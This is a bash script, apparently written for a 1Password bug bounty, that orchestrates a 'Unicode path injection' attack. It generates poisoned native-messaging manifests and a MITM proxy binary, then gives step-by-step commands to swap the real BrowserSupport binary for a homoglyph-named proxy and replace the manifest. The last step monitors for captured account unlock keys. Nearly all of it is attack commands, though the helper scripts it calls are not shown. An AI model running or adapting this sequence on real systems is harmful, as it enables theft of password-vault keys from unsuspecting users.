#!/bin/bash
#
# 1Password $1M Bug Bounty - Full Test Sequence
# Unicode Path Injection Attack
#

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "╔══════════════════════════════════════════════════════════╗"
echo "║     1Password Bug Bounty - Unicode Path Injection        ║"
echo "║                   Test Suite v1.0                        ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check Python
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}ERROR: Python 3 required${NC}"
    exit 1
fi

echo -e "${YELLOW}Phase 1: Filesystem Unicode Test${NC}"
echo "─────────────────────────────────────"
echo "Testing if your OS treats homoglyph paths as different..."
echo

python3 fs_test.py

echo
read -p "Press Enter to continue to Phase 2..."
echo

echo -e "${YELLOW}Phase 2: Locate Native Messaging Manifests${NC}"
echo "─────────────────────────────────────"
echo "Finding 1Password native messaging configuration..."
echo

python3 manifest_fuzzer.py --locate

echo
read -p "Press Enter to continue to Phase 3..."
echo

echo -e "${YELLOW}Phase 3: Generate Poisoned Manifests${NC}"
echo "─────────────────────────────────────"
echo "Creating manifests with homoglyph paths..."
echo

mkdir -p poisoned_manifests
python3 manifest_fuzzer.py --generate --output ./poisoned_manifests

echo
echo "Generated manifests are in: ./poisoned_manifests/"
ls -la ./poisoned_manifests/

echo
read -p "Press Enter to continue to Phase 4..."
echo

echo -e "${YELLOW}Phase 4: Create Test Proxy Binary${NC}"
echo "─────────────────────────────────────"
echo "Creating MITM proxy binary..."
echo

python3 manifest_fuzzer.py --test-binary --output ./poisoned_manifests

echo
echo -e "${YELLOW}Phase 5: Manual Installation${NC}"
echo "─────────────────────────────────────"
echo
echo "To complete the attack, you need to manually:"
echo
echo "1. BACKUP the original 1Password manifest:"
echo "   cp <manifest_location>/com.1password.1password.json ~/backup/"
echo
echo "2. RENAME the real 1Password binary:"
echo "   sudo mv /path/to/1Password-BrowserSupport /path/to/1Password-BrowserSupport-REAL"
echo
echo "3. CREATE a homoglyph-named copy of the proxy:"
echo "   cp ./poisoned_manifests/proxy_binary.py '/path/to/1Ρassword-BrowserSupport'"
echo "   chmod +x '/path/to/1Ρassword-BrowserSupport'"
echo
echo "4. REPLACE the manifest with a poisoned version:"
echo "   cp ./poisoned_manifests/poisoned_greek_P.json <manifest_location>/com.1password.1password.json"
echo
echo "5. SET environment variable for proxy:"
echo "   export REAL_1PASSWORD_PATH=/path/to/1Password-BrowserSupport-REAL"
echo
echo "6. RESTART browser and unlock 1Password"
echo
echo "7. MONITOR for intercepted keys:"
echo "   python3 auk_extractor.py --monitor"
echo

read -p "Have you completed manual installation? (y/n) " -n 1 -r
echo

if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo
    echo -e "${YELLOW}Phase 6: Monitor for Key Material${NC}"
    echo "─────────────────────────────────────"
    echo "Starting AUK extraction monitor..."
    echo "Unlock 1Password in your browser to capture keys."
    echo "Press Ctrl+C to stop and generate report."
    echo
    
    python3 auk_extractor.py --monitor
fi

echo
echo -e "${GREEN}Test sequence complete!${NC}"
echo
echo "Check these files for results:"
echo "  - /tmp/1password_intercept.log"
echo "  - /tmp/1password_captured_keys.json"
echo "  - /tmp/1password_extraction_report.txt"
